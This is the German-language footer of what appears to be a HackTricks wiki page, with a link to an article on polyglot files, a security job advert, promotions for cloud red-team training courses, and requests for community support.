* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie an einer **Hacking-Karriere** interessiert sind und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üend Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
